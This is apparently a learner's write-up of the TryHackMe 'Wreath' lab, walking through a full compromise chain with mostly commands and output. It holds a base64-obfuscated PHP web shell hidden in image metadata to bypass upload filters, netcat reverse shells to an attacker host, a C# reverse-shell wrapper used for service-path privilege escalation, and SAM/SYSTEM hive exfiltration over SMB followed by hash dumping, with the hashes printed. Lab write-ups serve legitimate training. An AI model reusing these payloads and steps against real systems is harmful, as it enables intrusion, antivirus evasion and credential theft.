+############server
+./ligolo-proxy -selfcert
+
+
+#####client
+./petstar-agent -connect 10.50.66.152:11601 -ignore-cert
+
+Afterexecuting the command on the client we recieve a connection back
+
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+WARN[0000] Using self-signed certificates               
+ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+WARN[0000] TLS Certificate fingerprint for ligolo is: E54C537D47D628180D70DAD8E64C727486AE9B382EDBA4EA3194C04FBFA17BC6 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.7.5
+
+ligolo-ng » INFO[0066] Agent joined.                                 id=014686f8-56a6-4fb8-bb98-3719f9c79ec3 name=root@prod-serv remote="10.200.73.200:42068"
+ligolo-ng » 
+ligolo-ng » session 
+? Specify a session : 1 - root@prod-serv - 10.200.73.200:42068 - 014686f8-56a6-4fb8-bb98-3719f9c79ec3
+[Agent : root@prod-serv] » start
+
+
+---Now we have access to the box .150 directly and we try to do a nmap
+ nmap 10.200.73.150 -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 10:12 GMT
+Nmap scan report for 10.200.73.150
+Host is up.
+All 1000 scanned ports on 10.200.73.150 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 201.36 seconds
+
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+--------------------------------Personnal PC Enumeration---------------------------
+
+After getting administrator hash and connect via evil-winrm, we decide to use empire scanning modules to do that
+
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 127.0.0.1 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Help Invoke-Portscan
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.73.100 -TopPorts 50
+
+
+Hostname      : 10.200.73.100
+alive         : True
+openPorts     : {80, 3389}
+closedPorts   : {}
+filteredPorts : {445, 443, 53, 143...}
+finishTime    : 4/3/2025 9:10:23 AM
+
+#####Answer to question Personnal PC enumeration
+--> 80,3389
+
+
+------------------------------Personnal PC Pivoting ----------------------------------
+As i do not have access to the entire network i decide to do a port fowarding of personnal pc 80 port to port 16000 on prod server(.200) 
+
+To do that we access to our prod server and open 2 ports one for the chisel server and one for the redirection.
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 16000/tcp
+success
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 16005/tcp
+
+After opening our ports i launch chisel server on the server prod
+
+[root@prod-serv tmp]# ./chisel-petstar server -p 16005 --reverse
+
+After that i decide to do the job easily so i connect myself to my rdp section with the account i previously created
+
+xfreerdp3 /v:127.0.0.1 /u:petstar /p:"petstar" +clipboard /dynamic-resolution /size:1280x720 /drive:Bureau,/home/thierry/Desktop
+
+but before doing it i put the chisel.exe file on ly desktop so arrive there i create 2 rukles to allow ooutbound and inbound trafic on Port 16005 because it with this port it will comunicate with my chisel server
+
+PS C:\Windows\system32> New-NetFirewallRule -DisplayName "Chisel Port 16005" -Direction Inbound -Protocol TCP -LocalPort 16005 -Action Allow
+PS C:\Windows\system32> New-NetFirewallRule -DisplayName "Chisel Port2 16005" -Direction Outbound -Protocol TCP -LocalPort 16005 -Action Allow
+
+After doing it i launch my chisel client on thje windows host
+
+C:\Users\petstar\Desktop>chisel_1.10.1_windows_amd64 client 10.200.73.200:16005 R:16000:10.200.73.100:80
+
+now i can access to the website on personnal PC (.100) with typing http://10.200.73.200:16000/ on my kali browser.
+
+#############Answer to questions personnal PC pivoting 
+--> PHP 7.4.11
+
+-----------------------------------------Personnal PC Wonder of Gift-------------------------
+Here we turn back to evil-winrm and connect ouselt so search a folder named website.git
+
+So we found it at C:\Gitstack\Repositories\Website.git 
+
+After finding it i connect myself to rdp to copy the folder propely because when i do rdp i have access to my kali desktop folder
+
+After doing that, we create folder named website and put the directory insiude. When it was done i replace the name of our directory: website.git into .git only. After that i use the tool the room give us to do it
+
+git clone https://github.com/internetwache/GitTools
+ 
+cd GitTools/
+
+cd Extractor
+
+./extractor.sh /home/thierry/Desktop/rooms/Tryhackme/wreath/website /home/thierry/Desktop/rooms/Tryhackme/wreath/dump
+
+I put the result into dump folder.
+
+----------------------------------------Website code analysis-------------------------------
+Now we have a dump folder we will use the repertory they give us to do our searches.
+
+dir name --> 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
+
+We will search for php files 
+
+ find . -type f -name "*.php"               
+./resources/index.php
+
+Go to see this file and read it
+
+#####Answer to questions--Website code analysis
+--> Neighbourhood Watch Meetings
+--> Basic auth
+--> jpg,jpeg,png,gif
+
+
+--------------------------------------Personnal PC Exploitation-----------------------------------
+I have rdp on .150 which have access to the .100 website we can use it or use our port fowarding we use recently
+
+When we access to the /resources we have a login pop-up so we logged in with thomas credential we cracked recently
+
+thomas:i<3ruby
+
+Now we are connected ans dwe see the upload panel. We have to upload our reverse shell to have access to this machine.
+As we know restrictions we will use exiftool to bypass it
+
+-First take an imahe
+-Replace the name into jpg.php --> cp images.png test-petstar.png.php
+-see the exiftool of the new image --> 
+				exiftool test-petstar.png.php                                                     
+				ExifTool Version Number         : 13.10
+				File Name                       : test-petstar.png.php
+				Directory                       : .
+				File Size                       : 11 kB
+				File Modification Date/Time     : 2025:04:04 10:07:35+00:00
+				File Access Date/Time           : 2025:04:04 10:07:35+00:00
+				File Inode Change Date/Time     : 2025:04:04 10:07:35+00:00
+				File Permissions                : -rw-rw-r--
+				File Type                       : PNG
+				File Type Extension             : png
+				MIME Type                       : image/png
+				Image Width                     : 191
+				Image Height                    : 264
+				Bit Depth                       : 8
+				Color Type                      : Palette
+				Compression                     : Deflate/Inflate
+				Filter                          : Adaptive
+				Interlace                       : Noninterlaced
+				Palette                         : (Binary data 303 bytes, use -b option to extract)
+				Image Size                      : 191x264
+				Megapixels                      : 0.050
+-Now add a php line into comment section --> exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-petstar.png.php
+-See the metadata with exiftool --> 
+				exiftool test-petstar.png.php                                                             
+				ExifTool Version Number         : 13.10
+				File Name                       : test-petstar.png.php
+				Directory                       : .
+				File Size                       : 11 kB
+				File Modification Date/Time     : 2025:04:04 10:10:31+00:00
+				File Access Date/Time           : 2025:04:04 10:10:31+00:00
+				File Inode Change Date/Time     : 2025:04:04 10:10:31+00:00
+				File Permissions                : -rw-rw-r--
+				File Type                       : PNG
+				File Type Extension             : png
+				MIME Type                       : image/png
+				Image Width                     : 191
+				Image Height                    : 264
+				Bit Depth                       : 8
+				Color Type                      : Palette
+				Compression                     : Deflate/Inflate
+				Filter                          : Adaptive
+				Interlace                       : Noninterlaced
+				Palette                         : (Binary data 303 bytes, use -b option to extract)
+				Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
+				Image Size                      : 191x264
+				Megapixels                      : 0.050
+-Now try upload the payload --> Cool it works 
+-Let check the result in the browser --> http://10.200.73.100/resources/uploads/test-petstar.png.php
+
+---------------------------------6Av evasion payload obfuscation ---
+After creating a new version of our payload we wil put our  obfuscated payload
+
+cp images.png shell-petstar.png.php
+
+
+exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-petstar.png.php 
+    1 image files updated
+
+
+now go to upload it.
+
+http://10.200.73.100/resources/uploads/shell-petstar.png.php?wreath=systeminfo
+
+Answer: 
+Host Name:                 WREATH-PC
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-70000-00000-AA778
+Original Install Date:     08/11/2020, 14:55:50
+System Boot Time:          06/04/2025, 00:06:29
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 24/08/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,356 MB
+Virtual Memory: Max Size:  2,432 MB
+Virtual Memory: Available: 1,813 MB
+Virtual Memory: In Use:    619 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 5 Hotfix(s) Installed.
+                           [01]: KB4580422
+                           [02]: KB4512577
+                           [03]: KB4580325
+                           [04]: KB4587735
+                           [05]: KB4592440
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.200.73.1
+                                 IP address(es)
+                                 [01]: 10.200.73.100
+                                 [02]: fe80::b4b2:af59:5ea3:b68f
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+
+
+http://10.200.73.100/resources/uploads/shell-petstar.png.php?wreath=whoami
+
+
+
+
+###Answer to questions
+--> WREATH-PC
+-->wreath-pc\thomas
+
+----------------------------Compiling netcat and reverse shell-------------------------------
+T do that we have many options but just one is interresting netcat one so we will download a good boinary from here: 
+
+git clone https://github.com/int0x33/nc.exe/
+
+
+After that we will send it on our .200 server 
+
+[root@prod-serv tmp]# curl 10.50.66.152/nc64.exe -o ncat.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 45272  100 45272    0     0  57233      0 --:--:-- --:--:-- --:--:-- 57161
+[root@prod-serv tmp]# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
+
+After that we will go to download it on our web shell with certutil or curl
+
+http://10.200.73.100/resources/uploads/shell-petstar.png.php?wreath=certutil
+
+before launching the python server on the .200 i have to open port 8000 tcp and udp
+
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 8000/tcp
+success
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 8000/udp
+success
+[root@prod-serv tmp]# python3 -m http.server
+
+Use this to create a version of ncat on the target
+
+http://10.200.73.100/resources/uploads/shell-petstar.png.php?wreath=curl%20http://10.200.73.200:8000/ncat.exe%20-o%20petstarnc.exe
+
+Now launch the ncat command to our reverse shell. We will reciueve it on the windows .150 machine we just have to upload a ncat there
+
+http://10.200.73.100/resources/uploads/shell-petstar.png.php?wreath=powershell.exe%20C:\xampp\htdocs\resources\uploads\petstarnc.exe%2010.200.73.200%201234%20-e%20cmd.exe
+
+Donot forget to open ports 
+The result---
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 1234/udp
+success
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 1234/tcp
+success
+[root@prod-serv tmp]# ./netcat-petstar -lvnp 1234
+Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.200.73.100.
+Ncat: Connection from 10.200.73.100:50098.
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>
+
+####Answer t questions --
+-->CertUtil: -dump command completed successfully.
+
+
+
+----------AV evasion Enumeration -----------------------------------
+or this task we will start with manual enumeratuin
+
+
+C:\xampp\htdocs\resources\uploads>whoami /priv    
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+C:\xampp\htdocs\resources\uploads>
+
+
+
+C:\xampp\htdocs\resources\uploads>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+C:\xampp\htdocs\resources\uploads>
+
+
+
+C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
+LSM                                                                                 LSM                                                                                                                                   Unknown    
+Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
+NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
+Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
+Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
+Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
+AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
+System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
+Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
+Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
+Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     
+
+
+C:\xampp\htdocs\resources\uploads>
+
+
+
+Lack of quotation on one pathname tell us that the service can be vulnerable: SystemExplorerHelpService
+
+Now we will search with which account the srvice is running
+
+C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService                                                 
+sc qc SystemExplorerHelpService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\xampp\htdocs\resources\uploads>
+
+
+Good it run with a local system account so we will check if we have write permissions on the service folder
+
+C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+         BUILTIN\Users Allow  -1610612736
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
+         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
+         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
+         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
+         ;;S-1-15-2-2)
+
+
+
+
+C:\xampp\htdocs\resources\uploads>
+
+
+Good we have ful control.
+
+We can download winpeas obfuscated version to see all potentials vulnerabilities
+
+#################Answer to questions Av evasion Enumeration---
+-->SeImpersonatePrivilege
+-->SystemExplorerHelpService
+-->Aye
+
+-------------------------------------------------------AV evasion priv esc --------------------------------
+
+After detecting the vulnerability we will create our csharp file and compile it
+
+cat wrapper.cs
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            Process proc = new Process();
+	    ProcessStartInfo procInfo = new ProcessStartInfo("C:\\xampp\\htdocs\\resources\\uploads\\petstarnc.exe", "10.200.73.200 1235 -e cmd.exe");
+	    procInfo.CreateNoWindow = true;
+	    proc.StartInfo = procInfo;
+	    proc.Start();
+        }
+    }
+}
+
+
+compiling the file
+
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ mcs wrapper.cs 
+
+
+
+After copy the exe file on the windows machine by ssh or smb
+
+Here i will use SMB share to use it after to exfiltration
+
+impacket-smbserver share . -smb2support -username petstar -password petstar
+
+And when we will want to download files we first connect ourselve
+
+net use \\10.50.66.152\share /USER:petstar petstar
+
+
+And copy our files with command:
+
+copy \\10.50.66.152\share\petstar-wrapper.exe petstar-wrapper.exe
+
+After copiying it we will put it in "C:\Program Files (x86)\System Explorer\" 
+
+copy petstar-wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
+
+c:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
+sc stop SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x1388
+
+c:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
+sc start SystemExplorerHelpService
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+c:\xampp\htdocs\resources\uploads>
+
+Now go to our reverse shell
+
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ rlwrap nc -lvnp 1235            
+listening on [any] 1235 ...
+connect to [10.50.66.152] from (UNKNOWN) [10.200.73.100] 50081
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+
+Youpii we get it
+
+###############Answer to questions
+-->
+---------------------------------------------------------Exfiltration technique and post exploitation--------------------------------
+After having privileged access on the machine, we will give a proof to our friend that we rooted his PC 
+
+we will get sam.bak and system.bak which will permit us to get system hashes.
+
+reg.exe save HKLM\SAM sam.bak
+reg.exe save HKLM\SYSTEM system.bak
+
+C:\Windows\Temp>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A041-2802
+
+ Directory of C:\Windows\Temp
+
+06/04/2025  22:10    <DIR>          .
+06/04/2025  22:10    <DIR>          ..
+06/04/2025  21:28           168,344 MpCmdRun.log
+06/04/2025  20:03            45,272 ncat.exe
+06/04/2025  21:49             3,584 petstar-wrapper.exe
+06/04/2025  20:12            45,272 petstarnc.exe
+06/04/2025  22:10            53,248 sam.bak
+06/04/2025  20:59                98 silconfig.log
+06/04/2025  22:10        18,509,824 system.bak
+06/04/2025  21:41             3,584 wrapper-pet.exe
+06/04/2025  21:41             3,584 wrapper.exe
+               9 File(s)     18,832,810 bytes
+               2 Dir(s)   7,001,698,304 bytes free
+
+C:\Windows\Temp>net use \\10.50.66.152\share /USER:petstar petstar
+net use \\10.50.66.152\share /USER:petstar petstar
+The command completed successfully.
+
+
+C:\Windows\Temp>copy sam.bak \\10.50.66.152\share
+copy sam.bak \\10.50.66.152\share
+        1 file(s) copied.
+
+C:\Windows\Temp>copy system.bak \\10.50.66.152\share
+copy system.bak \\10.50.66.152\share
+        1 file(s) copied.
+
+C:\Windows\Temp>
+
+
+Now we will extract system hashes
+
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+[*] Cleaning up... 
+
+
+###########Answer to questions
+-->Nay
+-->Encryption
+-->a05c3c807ceeb48c47252568da284cd2
+
+
+
+Thank you for reading my opinion of the room @petstar from togo
